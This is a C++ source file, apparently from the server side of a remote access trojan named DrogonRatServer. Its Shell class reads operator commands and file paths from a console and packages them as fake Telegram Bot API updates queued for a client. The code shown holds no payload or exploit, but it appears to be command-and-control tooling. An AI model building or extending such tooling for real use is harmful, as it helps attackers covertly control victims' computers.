#include "DrogonRatServer/Handler.hpp"

#include <thread>

namespace DrogonRatServer {

Handler::Shell::Shell(int64_t Update_Offset, int64_t Message_Offset,int64_t File_Offset, int64_t Chat_Id)
    : update_offset(Update_Offset), message_offset(Message_Offset),file_offset(File_Offset), chat_id(Chat_Id) {
    SHELL_LOG("Handler::Shell object constructed");
}

Handler::Shell::~Shell() {
    if(this->shell_thread.joinable()) {
        this->shell_thread.join();
        SHELL_LOG("Joining shell_thread");
    }
    SHELL_LOG("Destructing Handler::Shell object");
}

std::deque<Json::Value> &Handler::Shell::getPendingUpdatesQueue() {
    return this->pending_updates;
}

std::mutex &Handler::Shell::getPendingUpdatesMutex() {
    return this->pending_updates_mutex;
}

void Handler::Shell::setUpdateOffset(const int64_t &New_Update_Offset) {
    if(this->update_offset >= New_Update_Offset) {
        FILE_ERROR_LOG("Shell::update_offset is not incremented");
        return;
    }
    this->update_offset = New_Update_Offset;
}

void Handler::Shell::setMessageOffset(const int64_t &New_Update_Offset) {
    if(this->message_offset >= New_Update_Offset) {
        FILE_ERROR_LOG("Shell::message_offset is not incremented");
        return;
    }
    this->message_offset = New_Update_Offset;
}

void Handler::Shell::setChatId(const int64_t &New_Chat_Id) {
    if(this->chat_id == New_Chat_Id) {
        return;
    }
    this->chat_id = New_Chat_Id;
}

void Handler::Shell::interact() {
    this->shell_thread = std::thread([this]() {
        std::string input;
        while(true) {
            std::cout << "You> ";
            if(!std::getline(std::cin, input))
                break;

            if(input.empty())
                continue;

            if(input == ".q") {
                SHELL_LOG("Exiting shell.");
                break;
            }

            std::smatch match;
            std::string file_path, caption;
            std::regex file_regex(R"(--file=([^\s]+))");
            std::regex caption_regex(R"(--caption=([^\s].*))");

            if(std::regex_search(input, match, file_regex))
                file_path = match[1];
            if(std::regex_search(input, match, caption_regex))
                caption = match[1];

            Json::Value update;
            if(!file_path.empty())
                update = this->makeFileUpdate(std::move(file_path), std::move(caption));
            else
                update = this->makeTextUpdate(std::move(input));
            SHELL_LOG("Update object before being pushed into the queue\n{}", update.toStyledString());            
            std::scoped_lock<std::mutex> scoped_lock(this->pending_updates_mutex);
            this->pending_updates.push_back(std::move(update));
        }
    });
}

Json::Value Handler::Shell::makeTextUpdate(std::string &&arg_Text) {
    Json::Value update;
    update["update_id"] = this->update_offset + 1;

    Json::Value message;
    message["message_id"] = this->message_offset + 1;
    message["text"] = std::move(arg_Text);

    Json::Value chat;
    chat["id"] = this->chat_id;
    chat["type"] = "private";
    message["chat"] = std::move(chat);

    Json::Value from;
    from["id"] = this->chat_id;
    from["is_bot"] = false;
    message["from"] = std::move(from);

    update["message"] = std::move(message);
    return update;
}

Json::Value Handler::Shell::makeFileUpdate(std::string &&File_Path, std::string &&arg_Caption) {
    Json::Value update;
    update["update_id"] = this->update_offset;

    Json::Value message;
    message["message_id"] = this->message_offset;

    message["caption"] = std::move(arg_Caption);

    Json::Value document;
    document["file_name"] = std::filesystem::path(File_Path).filename().string();
    document["file_path"] = File_Path;
    document["mime_type"] = "application/octet-stream";
    document["file_id"] = "local_" + std::to_string(this->message_offset);

    message["document"] = std::move(document);

    Json::Value chat;
    chat["id"] = this->chat_id;
    chat["type"] = "private";
    message["chat"] = std::move(chat);

    Json::Value from;
    from["id"] = this->chat_id;
    from["is_bot"] = false;
    message["from"] = std::move(from);

    update["message"] = std::move(message);
    return update;
}
} // namespace  DrogonRatServer
